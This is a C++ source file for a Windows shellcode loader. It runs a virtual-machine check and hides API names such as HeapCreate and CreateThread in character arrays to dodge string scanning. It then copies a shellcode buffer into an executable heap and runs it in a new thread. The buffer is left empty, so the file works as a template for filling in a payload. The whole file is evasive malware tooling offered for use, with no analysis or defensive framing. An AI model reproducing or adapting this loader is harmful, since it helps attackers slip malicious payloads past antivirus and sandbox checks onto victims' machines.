#include <windows.h>
#include <iostream>
#include "Check_VM.h"

bool main()
{

    Check_VM();

    unsigned char shellcode[] = "";

    char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    HMODULE hkernel32 = GetModuleHandleA(kernel32);

    char HeapCreate[] = { 'H','e','a','p','C','r','e','a','t','e',0 };
    using HeapCreatePrototype = HANDLE(WINAPI*)(DWORD, SIZE_T, SIZE_T);
    HeapCreatePrototype hHeapCreate = (HeapCreatePrototype)GetProcAddress(hkernel32, HeapCreate);

    char HeapAlloc[] = { 'H','e','a','p','A','l','l','o','c',0 };
    using HeapAllocPrototype = LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T);
    HeapAllocPrototype hHeapAlloc = (HeapAllocPrototype)GetProcAddress(hkernel32, HeapAlloc);

    char RtlCopyMemory[] = { 'R','t','l','C','o','p','y','M','e','m','o','r','y',0 };
    using RtlCopyMemoryPrototype = void(WINAPI*)(void*, const void*, size_t);
    RtlCopyMemoryPrototype hRtlCopyMemory = (RtlCopyMemoryPrototype)GetProcAddress(hkernel32, RtlCopyMemory);

    char CreateThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d',0 };
    using CreateThreadPrototype = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CreateThreadPrototype hCreateThread = (CreateThreadPrototype)GetProcAddress(hkernel32, CreateThread);

    char WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
    using WaitForSingleObjectPrototype = DWORD(WINAPI*)(HANDLE, DWORD);
    WaitForSingleObjectPrototype hWaitForSingleObject = (WaitForSingleObjectPrototype)GetProcAddress(hkernel32, WaitForSingleObject);


    HANDLE Heap_Created = hHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //Using Heap instead of Virtualalloc
    LPVOID Heap_Handle = hHeapAlloc(Heap_Created, HEAP_ZERO_MEMORY, sizeof shellcode);
    hRtlCopyMemory(Heap_Handle, shellcode, sizeof shellcode); // Copy shellcode into new created heap
    DWORD threadID; //Create Thread to execute the shellcode

    HANDLE hThread = hCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)Heap_Handle, NULL, 0, &threadID);
    hWaitForSingleObject(hThread, INFINITE);

    return EXIT_SUCCESS;

}